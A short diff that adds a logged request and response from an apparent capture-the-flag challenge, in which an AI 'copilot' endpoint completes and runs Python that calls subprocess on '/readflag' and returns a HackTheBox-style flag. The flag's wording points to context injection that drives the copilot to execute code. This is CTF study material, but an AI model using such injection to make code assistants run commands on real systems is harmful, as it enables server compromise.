@@ -1,0 +1,3 @@
+POST /api/copilot/complete_and_run
+status=200
+body={"completion":"import subprocess\nprint(subprocess.check_output('/readflag').decode())# 可以返回的是字符串\nprint(subprocess.check_output('/readflag').decode())","result":"HTB{1nj3c73d_c0n73x7_c0p1l07_3x3cu73_c8d54761407a230c952d20dd2a655ff9}\nHTB{1nj3c73d_c0n73x7_c0p1l07_3x3cu73_c8d54761407a230c952d20dd2a655ff9}"}
